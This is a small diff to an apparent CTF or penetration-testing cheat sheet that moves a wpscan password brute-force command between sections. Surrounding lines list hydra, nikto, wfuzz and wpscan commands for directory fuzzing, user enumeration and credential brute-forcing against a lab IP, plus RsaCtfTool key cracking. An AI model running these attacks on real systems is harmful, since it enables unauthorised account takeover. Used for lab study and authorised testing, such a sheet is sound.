@@ -149,6 +149,7 @@ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2
 ```bash
 wpscan --url http://<adress>/ -e u (enum user)
 wpscan --url http://<adress>/ -e ap (plugin)
+wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
 ```
 # Brute Force Attack ✅📚
 ## Crack Type Cheat Sheet ✅
@@ -176,7 +177,6 @@ RsaCtfTool.py --publickey ./key.pub --private
 ### Web_Method Brute Force ✅
 ```bash
 nikto -h http://10.10.131.147:1234/manager/html -id bob:<password> (get-method)
-wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f $ip -s 80 http-get /protected/ -I
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f $ip -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
 ```
